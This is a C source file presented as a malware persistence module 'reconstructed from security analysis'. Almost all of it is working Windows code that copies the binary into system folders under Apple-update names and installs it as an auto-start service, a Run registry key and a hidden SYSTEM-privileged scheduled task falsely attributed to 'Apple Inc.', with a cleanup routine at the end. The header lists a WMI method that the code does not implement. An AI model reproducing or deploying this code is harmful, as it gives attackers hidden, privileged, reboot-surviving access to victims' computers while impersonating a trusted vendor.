/**
 * PE #1 - Persistence Module
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This module implements persistence mechanisms that allow
 * the malware to survive reboots and maintain access.
 * 
 * Persistence methods (requires SYSTEM privileges):
 * 1. Windows Service
 * 2. Registry Run Key
 * 3. Scheduled Task
 * 4. WMI Event Subscription
 */

#include "loader.h"
#include <shlwapi.h>
#include <taskschd.h>

#pragma comment(lib, "shlwapi.lib")

//=============================================================================
// CONFIGURATION
//=============================================================================

// Service configuration
#define SERVICE_NAME            L"AppleUpdate"
#define SERVICE_DISPLAY_NAME    L"Apple Software Update Service"
#define SERVICE_DESCRIPTION     L"Provides automatic updates for Apple software."

// Registry paths
#define REG_RUN_KEY             L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_VALUE_NAME          L"AppleUpdate"

// Task scheduler
#define TASK_NAME               L"AppleSoftwareUpdate"
#define TASK_FOLDER             L"\\Microsoft\\Windows\\Apple"

// Payload locations
#define PAYLOAD_PATH            L"C:\\Windows\\System32\\appupd.dll"
#define PAYLOAD_PATH_ALT        L"C:\\ProgramData\\Apple\\Update\\updater.exe"

//=============================================================================
// SERVICE PERSISTENCE
//=============================================================================

/**
 * Install persistence via Windows Service.
 * 
 * Creates a service that starts automatically at boot.
 * Runs as SYSTEM.
 */
static BOOL 
InstallServicePersistence(
    LPCWSTR PayloadPath
)
{
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_DESCRIPTIONW desc;
    WCHAR cmdLine[MAX_PATH * 2];
    BOOL success = FALSE;
    
    // Open Service Control Manager
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == NULL) {
        return FALSE;
    }
    
    // Build command line for rundll32
    swprintf_s(cmdLine, MAX_PATH * 2,
        L"C:\\Windows\\System32\\rundll32.exe \"%s\",DllMain",
        PayloadPath);
    
    // Create the service
    hService = CreateServiceW(
        hSCManager,
        SERVICE_NAME,
        SERVICE_DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,
        cmdLine,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );
    
    if (hService == NULL) {
        // Service may already exist
        hService = OpenServiceW(hSCManager, SERVICE_NAME, SERVICE_ALL_ACCESS);
    }
    
    if (hService != NULL) {
        // Set description
        desc.lpDescription = (LPWSTR)SERVICE_DESCRIPTION;
        ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &desc);
        
        success = TRUE;
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCManager);
    return success;
}

//=============================================================================
// REGISTRY PERSISTENCE
//=============================================================================

/**
 * Install persistence via Registry Run Key.
 * 
 * Adds entry to HKLM\...\Run for automatic execution.
 */
static BOOL 
InstallRegistryPersistence(
    LPCWSTR PayloadPath
)
{
    HKEY hKey = NULL;
    WCHAR cmdLine[MAX_PATH * 2];
    LONG result;
    
    // Build rundll32 command
    swprintf_s(cmdLine, MAX_PATH * 2,
        L"rundll32.exe \"%s\",DllMain",
        PayloadPath);
    
    // Open Run key in HKLM (requires elevation)
    result = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        REG_RUN_KEY,
        0,
        KEY_SET_VALUE,
        &hKey
    );
    
    if (result != ERROR_SUCCESS) {
        // Try HKCU as fallback
        result = RegOpenKeyExW(
            HKEY_CURRENT_USER,
            REG_RUN_KEY,
            0,
            KEY_SET_VALUE,
            &hKey
        );
    }
    
    if (result != ERROR_SUCCESS) {
        return FALSE;
    }
    
    // Set value
    result = RegSetValueExW(
        hKey,
        REG_VALUE_NAME,
        0,
        REG_SZ,
        (BYTE*)cmdLine,
        (DWORD)(wcslen(cmdLine) + 1) * sizeof(WCHAR)
    );
    
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

//=============================================================================
// SCHEDULED TASK PERSISTENCE
//=============================================================================

/**
 * Install persistence via Scheduled Task.
 * 
 * Creates a task that runs at logon and periodically.
 */
static BOOL 
InstallScheduledTaskPersistence(
    LPCWSTR PayloadPath
)
{
    HRESULT hr;
    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    ITaskDefinition* pTask = NULL;
    IRegistrationInfo* pRegInfo = NULL;
    IPrincipal* pPrincipal = NULL;
    ITaskSettings* pSettings = NULL;
    ITriggerCollection* pTriggers = NULL;
    ITrigger* pTrigger = NULL;
    ILogonTrigger* pLogonTrigger = NULL;
    IActionCollection* pActions = NULL;
    IAction* pAction = NULL;
    IExecAction* pExecAction = NULL;
    IRegisteredTask* pRegisteredTask = NULL;
    VARIANT varEmpty;
    BSTR bstrPath = NULL;
    BOOL success = FALSE;
    
    VariantInit(&varEmpty);
    
    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return FALSE;
    }
    
    // Create Task Service
    hr = CoCreateInstance(
        &CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_ITaskService,
        (void**)&pService
    );
    
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    // Connect to local task service
    hr = pService->lpVtbl->Connect(pService, varEmpty, varEmpty, varEmpty, varEmpty);
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    // Get root folder
    bstrPath = SysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, bstrPath, &pRootFolder);
    SysFreeString(bstrPath);
    
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    // Create new task
    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    // Set registration info
    hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
    if (SUCCEEDED(hr)) {
        pRegInfo->lpVtbl->put_Description(pRegInfo, 
            SysAllocString(L"Updates Apple software components."));
        pRegInfo->lpVtbl->put_Author(pRegInfo, 
            SysAllocString(L"Apple Inc."));
        pRegInfo->lpVtbl->Release(pRegInfo);
    }
    
    // Set principal (run as SYSTEM)
    hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
    if (SUCCEEDED(hr)) {
        pPrincipal->lpVtbl->put_UserId(pPrincipal, 
            SysAllocString(L"S-1-5-18"));  // SYSTEM SID
        pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_SERVICE_ACCOUNT);
        pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_HIGHEST);
        pPrincipal->lpVtbl->Release(pPrincipal);
    }
    
    // Set settings
    hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->lpVtbl->put_StartWhenAvailable(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->put_Hidden(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->put_DisallowStartIfOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->Release(pSettings);
    }
    
    // Add logon trigger
    hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggers);
    if (SUCCEEDED(hr)) {
        hr = pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_LOGON, &pTrigger);
        if (SUCCEEDED(hr)) {
            pTrigger->lpVtbl->Release(pTrigger);
        }
        pTriggers->lpVtbl->Release(pTriggers);
    }
    
    // Add action
    hr = pTask->lpVtbl->get_Actions(pTask, &pActions);
    if (SUCCEEDED(hr)) {
        hr = pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr)) {
            hr = pAction->lpVtbl->QueryInterface(pAction, 
                &IID_IExecAction, (void**)&pExecAction);
            if (SUCCEEDED(hr)) {
                WCHAR args[MAX_PATH * 2];
                swprintf_s(args, MAX_PATH * 2, L"\"%s\",DllMain", PayloadPath);
                
                pExecAction->lpVtbl->put_Path(pExecAction, 
                    SysAllocString(L"C:\\Windows\\System32\\rundll32.exe"));
                pExecAction->lpVtbl->put_Arguments(pExecAction, 
                    SysAllocString(args));
                pExecAction->lpVtbl->Release(pExecAction);
            }
            pAction->lpVtbl->Release(pAction);
        }
        pActions->lpVtbl->Release(pActions);
    }
    
    // Register the task
    hr = pRootFolder->lpVtbl->RegisterTaskDefinition(
        pRootFolder,
        SysAllocString(TASK_NAME),
        pTask,
        TASK_CREATE_OR_UPDATE,
        varEmpty,
        varEmpty,
        TASK_LOGON_SERVICE_ACCOUNT,
        varEmpty,
        &pRegisteredTask
    );
    
    if (SUCCEEDED(hr)) {
        success = TRUE;
        if (pRegisteredTask) {
            pRegisteredTask->lpVtbl->Release(pRegisteredTask);
        }
    }
    
cleanup:
    if (pTask) pTask->lpVtbl->Release(pTask);
    if (pRootFolder) pRootFolder->lpVtbl->Release(pRootFolder);
    if (pService) pService->lpVtbl->Release(pService);
    CoUninitialize();
    
    return success;
}

//=============================================================================
// PAYLOAD INSTALLATION
//=============================================================================

/**
 * Copy payload to system directory.
 */
static BOOL 
InstallPayload(
    LPCWSTR DestPath
)
{
    HMODULE hSelf;
    WCHAR selfPath[MAX_PATH];
    
    // Get our own path
    hSelf = GetModuleHandleW(NULL);
    if (hSelf == NULL) {
        return FALSE;
    }
    
    if (GetModuleFileNameW(hSelf, selfPath, MAX_PATH) == 0) {
        return FALSE;
    }
    
    // Create destination directory
    WCHAR destDir[MAX_PATH];
    wcscpy_s(destDir, MAX_PATH, DestPath);
    PathRemoveFileSpecW(destDir);
    CreateDirectoryW(destDir, NULL);
    
    // Copy file
    return CopyFileW(selfPath, DestPath, FALSE);
}

//=============================================================================
// MAIN PERSISTENCE FUNCTION
//=============================================================================

/**
 * Install all persistence mechanisms.
 * 
 * Tries multiple methods for redundancy.
 */
BOOL 
PE1_InstallPersistence(VOID)
{
    BOOL serviceOk = FALSE;
    BOOL registryOk = FALSE;
    BOOL taskOk = FALSE;
    BOOL payloadOk = FALSE;
    
    // First, copy payload to system location
    payloadOk = InstallPayload(PAYLOAD_PATH);
    if (!payloadOk) {
        payloadOk = InstallPayload(PAYLOAD_PATH_ALT);
    }
    
    if (!payloadOk) {
        // Can't install payload - use current location
        WCHAR currentPath[MAX_PATH];
        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
        
        registryOk = InstallRegistryPersistence(currentPath);
        return registryOk;
    }
    
    // Install using all available methods for redundancy
    
    // 1. Service (most persistent, runs as SYSTEM)
    serviceOk = InstallServicePersistence(PAYLOAD_PATH);
    
    // 2. Registry Run key (backup)
    registryOk = InstallRegistryPersistence(PAYLOAD_PATH);
    
    // 3. Scheduled Task (additional backup)
    taskOk = InstallScheduledTaskPersistence(PAYLOAD_PATH);
    
    // Success if at least one method worked
    return (serviceOk || registryOk || taskOk);
}

//=============================================================================
// PERSISTENCE REMOVAL (for cleanup/uninstall)
//=============================================================================

/**
 * Remove all persistence mechanisms.
 */
BOOL 
PE1_RemovePersistence(VOID)
{
    SC_HANDLE hSCManager, hService;
    HKEY hKey;
    BOOL success = TRUE;
    
    // Remove service
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager != NULL) {
        hService = OpenServiceW(hSCManager, SERVICE_NAME, DELETE);
        if (hService != NULL) {
            DeleteService(hService);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    // Remove registry key
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, REG_RUN_KEY, 0, 
                      KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, REG_VALUE_NAME);
        RegCloseKey(hKey);
    }
    
    // Remove scheduled task
    // (Would use COM TaskScheduler API)
    
    // Remove payload file
    DeleteFileW(PAYLOAD_PATH);
    DeleteFileW(PAYLOAD_PATH_ALT);
    
    return success;
}
